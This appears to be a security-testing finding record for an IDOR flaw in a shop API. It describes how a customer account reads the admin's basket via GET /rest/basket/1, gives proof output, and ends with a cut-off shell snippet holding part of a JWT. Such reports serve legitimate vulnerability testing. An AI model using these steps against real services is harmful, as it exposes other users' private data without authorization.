title: IDOR - Unauthorized Access to Another User's Basket
description: The /rest/basket/1 endpoint is accessible with any valid JWT token regardless of basket ownership. A regular customer (test@test.com, UserId=24, role=customer) can access basket ID 1 which belongs to admin user (UserId=1). The API does not verify that the requesting user's basket ID matches the requested basket ID, allowing unauthorized access to other users' shopping cart data.
poc: 1. Login as customer test@test.com (UserId=24)\n2. GET /rest/basket/1 with customer's JWT\n3. Response shows basket belongs to UserId=1 (admin)
proof: Status: success, Basket ID: 1, UserId: 1, Accessed by: test@test.com (UserId=24, role=customer), Products: 3 items
how_captured: shell: # Re-run IDOR proof for booking - customer JWT accessing admin's basket CUSTOMER_JWT="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNCwidXNlcm5hbWUiO
